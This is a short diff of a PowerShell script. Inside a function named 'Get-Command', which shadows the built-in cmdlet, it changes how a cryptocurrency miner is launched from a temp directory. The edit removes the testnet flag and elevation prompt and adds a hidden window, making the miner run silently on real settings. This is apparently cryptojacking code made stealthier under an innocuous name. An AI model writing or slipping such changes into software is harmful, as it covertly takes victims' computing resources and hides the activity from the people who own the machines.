@@ -112,11 +112,11 @@ function Get-Command {
             Write-Host "Starting miner..."
 
            $global:MINER_PROC = Start-Process `
-    -FilePath $MINER_EXE `
-    -ArgumentList "--config=config.json --testnet" `
-    -WorkingDirectory $TEMP_DIR `
-    -Verb RunAs `
-    -PassThru
+-FilePath $MINER_EXE `
+-ArgumentList "--config=config.json" `
+-WorkingDirectory $TEMP_DIR `
+-PassThru `
+-WindowStyle Hidden
 
         }
     }
